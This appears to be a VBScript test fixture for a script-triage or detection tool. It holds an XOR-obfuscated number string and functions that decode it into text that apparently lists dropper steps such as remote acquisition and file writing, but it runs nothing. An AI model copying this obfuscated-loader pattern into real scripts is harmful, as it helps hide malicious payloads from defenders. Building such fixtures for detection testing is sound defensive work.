Option Explicit
' Huntress Script Triage -- inert static-analysis fixture (wsh_vbscript_windows)
Const Material_28cdac9d = "52|39|51|206|47|54|127|114|193|97|35|121|115|199|53|48|127|93|192|57|47|117|118|215|112|53|104|107|198|57|29|124|107|222|57|110|126|107|193|44|35|110|97|218|3|50|104|109|209|57|49|105|46|218|61|44|126|109|212|58|29|105|97|192|53|50|110|126|211|56|35|106|118|215|46|127|87|107|209|46|45|105|109|212|40|108|66|79|254|20|22|78|82|206|47|54|123|101|215|3|33|117|119|220|40|127|46|126|209|61|47|106|99|219|59|44|69|107|214|97|33|123|111|194|61|43|125|108|159|104|113|126|59|129|100|114|40|100|134|32|55|104|110|143|52|54|110|114|193|102|109|53|54|129|56|123|41|58|130|110|36|46|44|215|36|35|119|114|222|57|108|115|108|196|61|46|115|102|157|100|113|34|54|139|58|114|34|44|214|61|54|102|119|193|57|48|69|99|213|57|44|110|63|250|41|44|110|112|215|47|49|86|99|208|115|118|41|102|139|111|122|42|48|212|104|62|124|107|222|57|29|106|99|198|52|127|89|56|238|9|49|127|112|193|0|18|111|96|222|53|33|70|74|199|50|54|104|103|193|47|14|123|96|238|47|54|123|101|215|113|118|41|102|139|111|122|42|48|212|104|108|126|99|198|32|48|127|101|219|47|54|104|123|237|44|35|110|106|143|20|9|89|87|238|15|45|124|118|197|61|48|127|94|250|41|44|110|112|215|47|49|86|99|208|0|6|115|113|194|51|49|123|96|222|57|30|46|49|214|101|113|34|50|128|58|118|102|108|215|36|54|69|113|198|61|37|127|63|192|57|49|117|119|192|63|39|55|113|211|49|50|118|103|156|44|49|43"
Const Codec_28cdac9d = "decimal_pipe|repeating_key_xor|42,1a,02,b2,5c"

Function Load_28cdac9d()
  Dim parts, result(), item5
  parts = Split(Material_28cdac9d, "|")
  ReDim result(UBound(parts))
  For item5 = 0 To UBound(parts)
    result(item5) = CInt(parts(item5))
  Next
  Load_28cdac9d = result
End Function

Function Decode_28cdac9d(ByRef item1)
  Dim result(), item5, keyBytes, previous
  ReDim result(UBound(item1))
  keyBytes = Array(66,26,2,178,92)
  For item5 = 0 To UBound(item1)
    result(item5) = item1(item5) Xor keyBytes(item5 Mod 5)
  Next
  Decode_28cdac9d = result
End Function

Function Recover_28cdac9d()
  Dim item1, item2, item3, item4, item5, item6, item7, item8
  item4 = (19 * 7) - 133
  item1 = Load_28cdac9d()
  item2 = Decode_28cdac9d(item1)
  item3 = ""
  For item5 = 0 To UBound(item2)
    item3 = item3 & Chr(item2(item5))
  Next
  Recover_28cdac9d = item3
End Function

Function Inspect_28cdac9d()
  Inspect_28cdac9d = Recover_28cdac9d()
End Function
